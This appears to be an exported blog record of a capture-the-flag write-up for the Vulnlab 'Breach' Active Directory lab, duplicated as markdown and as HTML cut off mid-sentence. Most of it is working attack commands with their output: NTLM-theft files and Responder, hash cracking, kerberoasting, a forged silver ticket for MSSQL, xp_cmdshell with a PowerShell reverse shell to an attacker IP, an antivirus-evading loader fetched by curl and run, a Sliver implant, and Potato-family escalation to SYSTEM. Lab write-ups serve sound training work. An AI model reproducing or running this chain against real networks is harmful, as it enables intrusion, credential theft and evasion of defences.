fetch, it will return an Kerberos TGS that is encrypted with the users password.\n\n```\n└─$ impacket-GetUserSPNs breach.vl/'julia.wong':'(JULIA.WONG PASSWORD)' -dc-ip 10.10.124.111 -request -usersfile ul.txt\n......\n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$da7e190c[...snip...]d20a2b\n```\n\nAs you can see from the above, a valid TGS was retrieved for the user `svc_mssql`. We can attempt to crack this with `hashcat`. You can find a list of hash modes [here](https://hashcat.net/wiki/doku.php?id=example_hashes) at the hashcat wiki. The specific hash type we have is TGS-REP Kerberos 5 e-Type 23, which is denoted as hash mode ID 13100.\n\n```\nedad60ef4608feef54bb95ed7683b4169c4f356cc7417a869bd6a9cfca8094e081c733f9940f9a8fd3341a31d25f32cda8c70a8115e3389ef562549914dae6a78b2e036378b4dcbd20a2b:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\n```\n\nFrom the above, we can that the password for `svc_mssql` was cracked successfully and you should have the plaintext password for the user.\n\n# Silver Ticket for MSSQL Takeover\n\nIf you take a look back at Bloodhound, this user node's SPN seems to belong to `MSSQLSvc/breachdc.breach.vl:1433`.\n\n![](/images/vulnlab/breach-vl/c.png)\n\nThis corresponds with the MSSQL service that is currently present on the domain controller. Given that we currently have credentials for this user, we could simply attempt to log in via their credentials and see what we can enumerate.\n\n```\n└─$ impacket-mssqlclient breach.vl/'svc_mssql@breach.vl':'(SVC_MSSQL PASSWORD)' -target-ip 10.10.105.115 -windows-auth\n\nSQL (BREACH\\svc_mssql  guest@master)>\n```\n\nIf you'll notice we are logged in as `svc_mssql`, however we're currently logged as the context of the Guest user. This means we won't be able to execute commands via `xp_cmdshell` which is one of the valid ways to execute commands through MSSQL. We could enumerate the local machine with `xp_dirtree` and use MSSQL queries to query to database, however you would not find much to my knowledge.\n\nThere's an interesting exploit that I learned through my progression in AD pen-testing and it involves precisely what we have now - a service account to MSSQL as well as that account have an SPN set for MSSQL. We could perform what's called a Silver Ticket attack, which is essentially impersonating the Administrator account to authenticate to MSSQL via a forged TGS. \n\nIf all goes well, we should be able to pass the silver ticket through to MSSQL and authenticate in the context of the Administrator user. Although we will still be executing commands through `xp_cmdshell` or `xp_dirtree` as `svc_mssql`, the MSSQL client will assume that we are logged in as the Administrator.\n\nYou can find the articles that I used for research into this [here](https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/) and [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket).\n\nSo there are a few things that we'll need to perform this, notably:\n\n* The NTLM hash of the `svc_mssql` account.\n* The domain SID of the `svc_mssql` account.\n* The SPN of the service we are requesting to.\n* The name of the user we want to impersonate.\n\nThis information is all easily accessible to us, excluding the NTLM hash of the service account. We do however already know their plaintext password, so we could just convert the plaintext to an NTLM hash. You can do so online, though I used [this one](https://codebeautify.org/ntlm-hash-generator) particularly.\n\nThe domain SID is also in Bloodhound within the `svc_mssql` user node, which is `S-1-5-21-2330692793-3312915120-706255856`.\n\nSPNs are essentially just the service and the machine DNS name put together, meaning the SPN we are requesting for is `mssql/breachdc.breach.vl`. As for the username, we're trying to impersonate the `Administrator`.\n\nWe can use `impacket-ticketer` with all the information above to request a ticket for the specified SPN. With all the info taken into account, you should receive a command similar to the below.\n\n```\n└─$ impacket-ticketer -nthash 69596C7[...snip...]870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -dc-ip 10.10.105.115 -spn mssql/breachdc.breach.vl -domain breach.vl Administrator\n......\n[*] Saving ticket in Administrator.ccache\n```\n\nAs you can see, the ticket was saved as `Administrator.ccache`. We'll now set this as our Kerberos authentication global variable and attempt to authenticate to MSSQL as the Administrator user.\n\n```\n└─$ export KRB5CCNAME=Administrator.ccache\n\n└─$ impacket-mssqlclient -k breachdc.breach.vl -target-ip 10.10.105.115\nSQL (BREACH\\Administrator  dbo@master)>\n```\n\nIt looks like we were successfully logged within the context of Administrator, let's see if we can enable command execution.\n\n```\nSQL (BREACH\\Administrator  dbo@master)> enable_xp_cmdshell\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\nSQL (BREACH\\Administrator  dbo@master)> xp_cmdshell whoami\noutput             \n----------------   \nbreach\\svc_mssql   \n\nNULL\n```\n\nIt seems as though we can! Now that we are able to do this, let's see if we can execute any arbitrary commands to gain a reverse shell. I opted to use a base64'd powershell reverse shell that you can make via [revshells.com](https://www.revshells.com/).\n\n```\nSQL (BREACH\\Administrator  dbo@master)> xp_cmdshell powershell -e (POWERSHELL BASE64 REV SHELL ENCODED)\noutput                                                                             \n--------------------------------------------------------------------------------   \n#< CLIXML                                                                          \n\n<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"><S S=\"Error\">At line:1 char:1_x000D__x000A_</S><S S=\"Error\">+ $client = New-Object System.Net.Sockets.TCPClient(\"10.8.0.173\",9001); ..._x000D__x000A_</S><S S=\"Error\">+ ~~~~~~~   \n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S=\"Error\">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S=\"Error\">    + CategoryInfo          : ParserError: (   \n\n:) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S=\"Error\">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S=\"Error\"> _x000D__x000A_</S></Objs>\n```\n\nIf you'll notice from the above command output, it seems that AV is enabled on this machine - meaning we can't simply execute malicious files as we normally would.\n\n# Bypassing AV with PE Loaders\n\nSince this is a Windows 2022 Datacenter (which I found later on for Priv Esc), we could simply just upload a Havoc binary since the signatures for [Havoc C2](https://github.com/HavocFramework/Havoc) beacons are not considered malicious in this version of Windows. If you stood up a havoc server, you should be able to upload the demon x64 binary through MSSQL and execute it to get a reverse shell.\n\nI wanted to use a different exploit this time around though that involves using Sliver. There's a really interesting loader that I learned to use recently for AV bypass - one that even works for the most recent version of Windows 11. This specific loader is called [FilelessPELoader](https://github.com/SaadAhla/FilelessPELoader), and it requires a bit of signature detection obfuscation before utilizing it properly. Luckily enough, the author of this loader (seamys, all credit goes to him for the development of this loader) has made a relatively short walkthrough on how to do this that you can find [here](https://youtu.be/NmB2MPAafTo?si=58ITZ4LFxG2DBc2t).\n\nSo if you've followed the loader walkthrough video accordingly, you should have the executable compiled from Visual Studio. I'll spin up a quick [Sliver C2](https://github.com/BishopFox/sliver) server and create an implant as well as start an MTLS listener.\n\n```\nsliver > mtls\n[*] Starting mTLS listener ...\n[*] Successfully started job #1\nsliver > generate --mtls (YOUR IP) --os windows --format exe --arch amd64 --save (DIRECTORY) --name breach\n```\n\nSkipping symbol obfuscation with `--skip-symbols` shouldn't matter here, though if you do run into problems with the loader feel free to set that to a newly generated binary.\n\nNext be sure to load this with the `aes.py` file that is provided in the FilelessPELoader GitHub repo, we can do this easily by running it with `python3 aes.py breach.exe`. This should generated the respective key files needed for the exploit.\n\nNow that all of the legwork is done, you should have four files within your directory - `breach.exe`, `cipher.bin`, `key.bin`, and finally your obfuscated loader that you compiled previously. Make sure to host your directory that contains these four files with a simple Python HTTP server at the port of your choosing. We'll now head back to MSSQL and execute the commands needed to exploit this.\n\n```\nSQL (BREACH\\Administrator  dbo@master)> xp_cmdshell powershell \"cd C:\\; mkdir temp; cd C:\\temp; curl http://(YOUR IP):9001/dazzad.exe -O dazzad.exe; .\\dazzad.exe (YOUR IP) 9001 cipher.bin key.bin\"\n```\n\nThe above one-liner should create a temp directory in `C:\\` and download the loader, before finally executing the key files remotely based on your HTTP server.\n\n![](/images/vulnlab/breach-vl/d.png)\n\nAs you can see after a bit of waiting, a session has been created as `svc_mssql`.\n\n# Exploiting SeImpersonatePrivilege Against SYSTEM\n\nNow that we have code execution as `svc_mssql` on the remote system, we can look around to see if their are any binaries or privileges that we can exploit.\n\nLuckily enough, this should not be very difficult as we already contain a privilege that we exploited previously to impersonate Administrator on the MSSQL service. We can use this same privilege to impersonate SYSTEM on the local machine.\n\nBefore we do this though, I want to detail why this exploit specifically works with a service account that has SeImpersonatePrivilege. Service accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.\n\n![](/images/vulnlab/breach-vl/e.png)\n\nExploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.\n\nIn the past and up until now, the easiest way was to utilize the Potato Family of exploits to impersonate and spawn this named pipe. As of today, most of the Potato family has been detected by Defender which renders most of the executables unusable with traditional means.\n\nLuckily enough since we currently have a session through an obfuscated payload that isn't detected by Defender, we can execute these binaries through a .NET assembly that shouldn't allow them to be detected from Defender's behavioral detection. I tested this out with two different exploits in the Potato family, notably [SweetPotato](https://github.com/CCob/SweetPotato) and [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato).\n\nYou'll need to compile both of these executables in Visual Studio on a Windows host before using it with Sliver.\n\n```\n└─$ ls | grep Potato\nSharpEfsPotato.exe\nSweetPotato.exe\n```\n\nNow that we have either one of these executables, we can use Sliver's built-in `execute-assembly` command to execute these binaries through a .NET assembly. This prevents us from needing to drop the binaries locally on the compromised machine.\n\nI've provided the arguments that you'll need in order to execute either one of these exploits. Both will land you a new session as SYSTEM if exploited correctly. Remember to ensure that you still have your simple Python HTTP server running since the arguments passed into either exploit will be executing our loader from before.\n\nThe first that I'll show is using SharpEfsPotato to exploit this.\n\n```\nsliver (breach) > execute-assembly SharpEfsPotato.exe '-p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin\"'\n\n[*] Output:\nSharpEfsPotato by @bugch3ck\n  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n\n  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/e5b2e9a2-d802-4d36-aeab-2e0e4482647b/\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b\ndf1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:\n[x]RpcBindingSetAuthInfo failed with status 0x6d3\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\n[*] Session b4eedc0a breach - 10.10.112.238:63780 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:20:05 EDT\n```\n\nAnd the next that I'll show is using SweetPotato to exploit the same functionality.\n\n```\nsliver (breach) > execute-assembly SweetPotato.exe '-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin\" -e EfsRpc'\n\n[*] Output:\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/ad72050e-613c-4ae3-a1c0-1c8f6908f715/\\ad72050e-613c-4ae3-a1c0-1c8f6908f715\\ad72050e-613c-4ae3-a1c0-1c8f6908f715\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\n[*] Session 4123ca51 breach - 10.10.112.238:63856 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:24:18 EDT\n```\n\nNote that I needed to specify the exploit mode to `EfsRpc` as the other exploit modes should fail due to an unsuccessful authentication interceptions. I've found this to really only work consistently with `EfsRpc`.\n\n![](/images/vulnlab/breach-vl/f.png)\n\nAs seen from the above, both have spawned a session as SYSTEM. This means that we can simply use either session and access the root flag within the Administrator's Desktop directory.\n\n```\nsliver (breach) > use 4123ca51-3f10-4ee7-a5e5-7142245ad26a\n\n[*] Active session breach (4123ca51-3f10-4ee7-a5e5-7142245ad26a)\n\nsliver (breach) > cat \"C:\\Users\\Administrator\\Desktop\\root.txt\"\n\nVL[...snip...]\n```\n\nNow that we have read the root flag, we have successfully compromised this machine!\n\n# Conclusion\n\nI came back to this machine after not initially knowing what I was doing the first time around. I had completed it, but I didn't really learn much from it. After about a few months of practicing red-teaming, I was more confident in what I was doing and put a lot of the resources that I had learned to the test. It seems that it paid off, which I'm satisfied with.\n\nBig thanks to xct for creating this machine, this machine was very fulfilling.\n\n# Resources\n\nhttps://wiki.vulnlab.com/guidance/medium/breach\nhttps://github.com/Greenwolf/ntlm_theft\nhttps://www.kali.org/tools/responder/\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.kali.org/tools/bloodhound/\nhttps://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/\nhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\nhttps://codebeautify.org/ntlm-hash-generator\nhttps://www.revshells.com/\nhttps://github.com/HavocFramework/Havoc\nhttps://github.com/SaadAhla/FilelessPELoader\nhttps://www.youtube.com/watch?si=58ITZ4LFxG2DBc2t&v=NmB2MPAafTo&feature=youtu.be\nhttps://github.com/BishopFox/sliver\nhttps://github.com/CCob/SweetPotato\nhttps://github.com/bugch3ck/SharpEfsPotato","slug":"breach","published":1,"updated":"2024-06-29T05:03:37.497Z","_id":"clxznjhrl00006muf11qxf3tb","comments":1,"layout":"post","photos":[],"content":"<p>Breach in particular was one of the first Vulnlab machines I had tried when I started Vulnlab back in December - though I really didn’t know what was going on as I had just started off doing red team labs. Since then, I’ve done essentially every easy machine on the Vulnlab archive and large amount of seasonal machines on HTB. Hopefully I’ll be able to relay this a bit easier this time around.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start out with our usual NMAP scans, just the default.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 17:08 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.101.89</span><br><span class=\"line\">Host is up (0.13s latency).</span><br><span class=\"line\">Not shown: 986 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds</span><br></pre></td></tr></table></figure>\n\n<p>We have a few ports to take a look at here, notably the HTTP server, LDAP, and SMB. Another big thing to mention is that MSSQL seems to be externally facing - which is a vulnerability in of itself. This database and this service should be internal.</p>\n<p><img src=\"/images/vulnlab/breach-vl/b.png\"></p>\n<p>The HTTP server seems to be a default IIS page, with nothing much else on it. It doesn’t seem to be associated with a domain, meaning there’s a high chance that we don’t need to enumerate for any subdomains.</p>\n<p>Gobuster didn’t seem to return any results either in terms of directory brute-forcing. I couldn’t find much aside from this in terms of the IIS server, so we’ll move to another service.</p>\n<p>In terms of the domain itself, I found the DNS names for the target machine denoted as <code>BREACHDC.breach.vl</code> as seen in the RDP results.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">|_ssl-date: 2024-06-10T21:17:12+00:00; +4s from scanner time.</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: BREACH</span><br><span class=\"line\">|   NetBIOS_Domain_Name: BREACH</span><br><span class=\"line\">|   NetBIOS_Computer_Name: BREACHDC</span><br><span class=\"line\">|   DNS_Domain_Name: breach.vl</span><br><span class=\"line\">|   DNS_Computer_Name: BREACHDC.breach.vl</span><br><span class=\"line\">|   DNS_Tree_Name: breach.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-06-10T21:16:33+00:00</span><br><span class=\"line\">| ssl-cert: Subject: commonName=BREACHDC.breach.vl</span><br></pre></td></tr></table></figure>\n\n<p>We can fill these in within our <code>/etc/hosts</code> file to make sure that the IP address is resolved to both of these domain names.</p>\n<p>In terms of SMB, it seems that we have access to enumerate multiple shares as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.101.89 -N               </span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">        ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">        C$              Disk      Default share</span><br><span class=\"line\">        IPC$            IPC       Remote IPC</span><br><span class=\"line\">        NETLOGON        Disk      Logon server share </span><br><span class=\"line\">        share           Disk      </span><br><span class=\"line\">        SYSVOL          Disk      Logon server share </span><br><span class=\"line\">        Users           Disk      </span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.101.89 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>These specific shares are <code>share</code> and <code>Users</code>, which we can enumerate for the possibility of any obscene abnormalities. The <code>Users</code> share did not seem to have anything within it aside from the default user folder, so I moved on to see if there was anything within <code>share</code>.</p>\n<p>There are three folders within this specific SMB share, being <code>finance</code>, <code>software</code>, and <code>transfer</code>. While we don’t have access to two of them, it seems that there are a few users within <code>transfer</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\transfer\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Feb 17 09:00:35 2022</span><br><span class=\"line\">  ..                                  D        0  Thu Feb 17 09:11:08 2022</span><br><span class=\"line\">  claire.pope                         D        0  Thu Feb 17 06:21:35 2022</span><br><span class=\"line\">  diana.pope                          D        0  Thu Feb 17 06:21:19 2022</span><br><span class=\"line\">  julia.wong                          D        0  Thu Feb 17 06:24:39 2022</span><br><span class=\"line\"></span><br><span class=\"line\">7863807 blocks of size 4096. 2618937 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>We don’t have access to any of these users, though we do know now that these are potentially users that we’ll need to compromise.</p>\n<p>I ran a few tests through Kerberos with these users, however it doesn’t seem like they have <code>no-preauth</code> set or any of them are kerberoastable. There wasn’t much outside of this, as the other directories in this share didn’t seem to have much.</p>\n<p>Given what we know (or lack thereof) at this point, I tried to get a nudge from the <a href=\"https://wiki.vulnlab.com/guidance/medium/breach\">Wiki</a> to see if there were any leads. It seems that the site says <code>- Assume that someone is visiting the share regulary.</code>, which points us back at SMB.</p>\n<h1 id=\"NTLM-Theft-for-Credential-Stealing\"><a href=\"#NTLM-Theft-for-Credential-Stealing\" class=\"headerlink\" title=\"NTLM Theft for Credential Stealing\"></a>NTLM Theft for Credential Stealing</h1><p>If you’ll notice, it seems that we have write access to the share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Feb 17 09:11:08 2022</span><br><span class=\"line\">  ..                                DHS        0  Thu Feb 17 10:38:00 2022</span><br><span class=\"line\">  finance                             D        0  Thu Feb 17 06:19:34 2022</span><br><span class=\"line\">  software                            D        0  Thu Feb 17 06:19:12 2022</span><br><span class=\"line\">  transfer                            D        0  Tue Jun 11 00:58:38 2024</span><br><span class=\"line\"></span><br><span class=\"line\">7863807 blocks of size 4096. 2597887 blocks available</span><br><span class=\"line\">smb: \\&gt; put ul.txt</span><br><span class=\"line\">putting file ul.txt as \\ul.txt (0.2 kb/s) (average 0.2 kb/s)</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have write access and we know that there are individuals that are visiting the share, our foothold seems to be phishing (or at least emulating phishing). We’ll more than likely need to place either a reverse shell or some kind of hash theft file within this share. Just a small assumption I made based on the difficulty of the machine - us uploading a reverse shell probably isn’t what we’re supposed to do here.</p>\n<p>So our next tactic we’ll utilize will have to be aimed more at credential theft. This is where I learned about a new tactic that we could try - <a href=\"https://github.com/Greenwolf/ntlm_theft\">NTLM Theft</a>.</p>\n<p>We can use the above tool to generate files that are used for stealing NTLM hashes. If a user is accessing and opening these files, we can point these same files back to a server we stand up to steal said credentials. We can use tools like <a href=\"https://www.kali.org/tools/responder/\">Responder</a> or Impacket’s SMB server to steal these credentials, I’ll use responder for this though you could use the ladder.</p>\n<p>After downloading the tool from the repository, we can use it with the below command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 ntlm_theft.py -s (KALI IP) -f daz -g all</span><br><span class=\"line\">Created: daz/daz.scf (BROWSE TO FOLDER)</span><br><span class=\"line\">Created: daz/daz-(url).url (BROWSE TO FOLDER)</span><br><span class=\"line\">Created: daz/daz-(icon).url (BROWSE TO FOLDER)</span><br><span class=\"line\">......</span><br><span class=\"line\">Generation Complete.</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have all of these files, we’ll need to start up Responder and then place of these files within the share. You can start up responder with <code>sudo responder -I (VPN INTERFACE NAME).</code></p>\n<p>I also created a short one-liner that will upload these files to the share, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for file in $(ls .); do smbclient -c &quot;cd transfer; put $file&quot; \\\\\\\\10.10.100.72\\\\share -N; done</span><br></pre></td></tr></table></figure>\n\n<p>This should upload all of the files to the directory, I adjusted us to upload them within the <code>transfer</code> directory as I found immediate luck within that specific folder in the share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[SMB] NTLMv2-SSP Client   : 10.10.100.72</span><br><span class=\"line\">[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong</span><br><span class=\"line\">[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:7a6c9594b3106927:59112474C75D713D82011FAC045A066C:010100000000000000F9EE819EBBDA015CDC76BFA3AFC7C3[...snip...]000009001E0063006900660073002F00310030002E0038002E0030002E003100370033000000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we received the NTLMv2 hash for the user <code>julia.wong</code>. Now that we have their hash, we can try to crack it using hashcat.</p>\n<p>The hash identifier for NetNTLMv2 hashes is 5600. You can find this within the hashcat <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">example hashes</a> page.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 5600 julia_wong.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">0f27aeed2fce6717ed091b98a2417efc8960a080416ea342bfd343d4b9ae2f6830a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0030002e003100370033000000000000000000:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 5600 (NetNTLMv2)</span><br></pre></td></tr></table></figure>\n\n<p>This should give you the plaintext password for <code>julia.wong</code>, meaning we can now utilize their credentials to perform a variety of different actions within this machine. If you log back in to SMB using these credentials, you’ll find the first flag for the machine located within <code>julia.wong</code>‘s directory.</p>\n<h1 id=\"Dumping-LDAP\"><a href=\"#Dumping-LDAP\" class=\"headerlink\" title=\"Dumping LDAP\"></a>Dumping LDAP</h1><p>I verified with crackmapexec, it seems that we do not have WinRM access meaning we’ll need to pivot to another service&#x2F;user. We can first attempt to enumerate LDAP, as we’ll be able to see if there are any other users we can pivot to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.100.72 -u &#x27;julia.wong&#x27; -p &#x27;(JULIA.WONG PASSWORD)&#x27;</span><br><span class=\"line\">SMB         10.10.100.72    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.100.72    389    BREACHDC         [+] breach.vl\\julia.wong:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Let’s utilize the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a> for <a href=\"https://www.kali.org/tools/bloodhound/\">Bloodhound</a> to dump the domain, as we can try to enumerate what our current user can do along with getting a user list of all the user objects within the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;breach.vl&#x27; -u &#x27;julia.wong&#x27; -p &#x27;Computer1&#x27; -c all -ns 10.10.124.111 --zip</span><br></pre></td></tr></table></figure>\n\n<p>Our <code>julia.wong</code> user node does not seem to have anything at first glance, though we can keep looking around for other user objects that may have other privileges.</p>\n<p>There are a few things that I like to do at this point - notably creating a user list of all the domain users (if one wasn’t acquired previously) and then using that to either kerberoast&#x2F;ASREProast. Since we have all of the domain objects in Bloodhound you could just write them into a text file, I also provided a one-liner that does an LDAP query and greps for all of the usernames.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -LLL -H ldap://breachdc.breach.vl -D &#x27;julia.wong@breach.vl&#x27; -b &#x27;DC=breach,DC=vl&#x27; -w &#x27;(JULIA.WONG PASSWORD)&#x27; | grep userPrincipalName | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>This should return a user list for all of the domain user objects that are within the AD environment. Let’s now use <code>GetUserSPNs</code> to test if any users are kerberoastable. Since we have access to LDAP, what the tool we’re about to use is doing is essentially fetching a password hash for user accounts linked to a Service Principal Name (SPN). If any users are able to have this password fetch, it will return an Kerberos TGS that is encrypted with the users password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetUserSPNs breach.vl/&#x27;julia.wong&#x27;:&#x27;(JULIA.WONG PASSWORD)&#x27; -dc-ip 10.10.124.111 -request -usersfile ul.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$da7e190c[...snip...]d20a2b</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, a valid TGS was retrieved for the user <code>svc_mssql</code>. We can attempt to crack this with <code>hashcat</code>. You can find a list of hash modes <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a> at the hashcat wiki. The specific hash type we have is TGS-REP Kerberos 5 e-Type 23, which is denoted as hash mode ID 13100.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">edad60ef4608feef54bb95ed7683b4169c4f356cc7417a869bd6a9cfca8094e081c733f9940f9a8fd3341a31d25f32cda8c70a8115e3389ef562549914dae6a78b2e036378b4dcbd20a2b:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>From the above, we can that the password for <code>svc_mssql</code> was cracked successfully and you should have the plaintext password for the user.</p>\n<h1 id=\"Silver-Ticket-for-MSSQL-Takeover\"><a href=\"#Silver-Ticket-for-MSSQL-Takeover\" class=\"headerlink\" title=\"Silver Ticket for MSSQL Takeover\"></a>Silver Ticket for MSSQL Takeover</h1><p>If you take a look back at Bloodhound, this user node’s SPN seems to belong to <code>MSSQLSvc/breachdc.breach.vl:1433</code>.</p>\n<p><img src=\"/images/vulnlab/breach-vl/c.png\"></p>\n<p>This corresponds with the MSSQL service that is currently present on the domain controller. Given that we currently have credentials for this user, we could simply attempt to log in via their credentials and see what we can enumerate.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-mssqlclient breach.vl/&#x27;svc_mssql@breach.vl&#x27;:&#x27;(SVC_MSSQL PASSWORD)&#x27; -target-ip 10.10.105.115 -windows-auth</span><br><span class=\"line\"></span><br><span class=\"line\">SQL (BREACH\\svc_mssql  guest@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll notice we are logged in as <code>svc_mssql</code>, however we’re currently logged as the context of the Guest user. This means we won’t be able to execute 